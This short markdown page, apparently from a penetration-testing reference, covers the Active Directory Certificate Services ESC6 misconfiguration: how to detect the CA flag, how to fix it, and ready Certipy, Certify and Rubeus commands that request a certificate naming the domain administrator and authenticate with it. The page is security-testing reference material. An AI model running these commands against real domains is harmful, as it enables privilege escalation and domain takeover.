# ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 (CA-Wide SAN Abuse)

## Why It's Vulnerable

The CA itself has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled. This flag lets a requester supply a SAN on *any* certificate request - even templates that would normally build the subject from AD. In practice: every client-auth template on that CA becomes [ESC1](esc1.md).

## How to Identify It

Certipy output on the CA (not the template) will show:
```
[!] Vulnerabilities
    ESC6: Enabled 'EDITF_ATTRIBUTESUBJECTALTNAME2' flag
```

## The Attack

Pick any template you can enroll in that permits Client Authentication (the default `User` template usually works), then supply the SAN:

```sh
certipy req -u user@corp.local -p pass -dc-ip <DC-IP> \
  -ca CORP-CA \
  -template User \
  -upn administrator@corp.local

certipy auth -pfx administrator.pfx -dc-ip <DC-IP>
```

**Post-May-2022 patch note:** After the May 2022 Microsoft updates (KB5014754), the DC ignores the SAN unless the cert also embeds the requester's SID via the `szOID_NTDS_CA_SECURITY_EXT` extension. Chained with **ESC9/ESC10/ESC16** (missing SID extension enforcement) it still works - otherwise auth fails with `KDC_ERR_PADATA_TYPE_NOSUPP`.

### Certify.exe (Windows alternative)

```powershell
Certify.exe request /ca:CA-HOST\CORP-CA /template:User /altname:administrator
Rubeus.exe asktgt /user:administrator /certificate:<base64-pfx> /nowrap /getcredentials
```

---

## Remediation

Remove the flag on the CA and restart the service:
```
certutil -config <CA-host>\<CA-name> -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
net stop certsvc && net start certsvc
```
